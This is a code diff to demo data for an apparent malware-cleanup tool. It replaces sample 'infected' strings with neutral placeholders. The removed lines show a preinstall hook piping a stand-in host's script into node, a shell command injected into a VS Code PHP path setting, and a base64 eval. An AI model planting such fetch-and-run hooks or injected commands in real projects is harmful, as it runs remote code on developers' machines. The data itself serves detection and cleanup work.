@@ -10,19 +10,19 @@ const DEMO_ISSUES: CleanupIssue[] = [
   {
     path: "package.json",
     line: 24,
-    infected: '"preinstall": "curl -s https://cdn.evil/x | node"',
+    infected: '"preinstall": "unexpected remote installer command"',
     cleaned: "// preinstall hook removed",
   },
   {
     path: ".vscode/settings.json",
     line: 7,
-    infected: '"php.validate.executablePath": "/usr/bin/php\\n; curl … | sh"',
+    infected: '"php.validate.executablePath": "unexpected shell command"',
     cleaned: '"php.validate.executablePath": "/usr/bin/php"',
   },
   {
     path: "eslint.config.js",
     line: 41,
-    infected: "eval(Buffer.from('Y29uc29sZS5sb2coJ3AxJyk=', 'base64').toString())",
+    infected: "obfuscated executable expression",
     cleaned: "// obfuscated payload removed",
   },
 ];
